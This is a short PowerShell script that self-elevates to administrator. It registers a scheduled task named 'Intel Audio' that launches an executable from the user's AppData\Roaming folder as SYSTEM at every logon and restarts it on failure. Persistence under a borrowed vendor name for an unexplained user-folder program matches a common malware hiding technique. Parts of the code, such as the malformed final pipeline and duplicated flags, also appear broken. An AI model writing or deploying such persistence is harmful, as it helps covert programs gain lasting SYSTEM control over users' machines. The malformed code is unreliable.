# Clear-Host
# Self-elevate the script if required
if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
      if ([int](Get-CimInstance -Class Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber) -ge 6000) {
            $CommandLine = "-NoExit -c cd '$pwd'; & `"" + $MyInvocation.MyCommand.Path + "`""
            Start-Process powershell -Verb runas -ArgumentList $CommandLine
            Exit
  }
}

$taskName = "Intel Audio"
$taskTrigger = New-ScheduledTaskTrigger -AtLogOn -AsJob -RandomDelay -User "SYSTEM"
$taskAction = New-ScheduledTaskAction -Execute '%USERPROFILE%\AppData\Roaming\Intel Corporation\Intel Audio Service\Intel Audio.exe' -AsJob -WorkingDirectory '%USERPROFILE%\AppData\Roaming\Intel Corporation\Intel Audio'
$taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -DontStopOnIdleEnd -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 5)
Register-ScheduledTask -TaskName $taskName -Trigger $taskTrigger -Action $taskAction -RunLevel Highest -Force -User 'SYSTEM' -Settings $taskSettings -Force | Start-ScheduledTask=$true
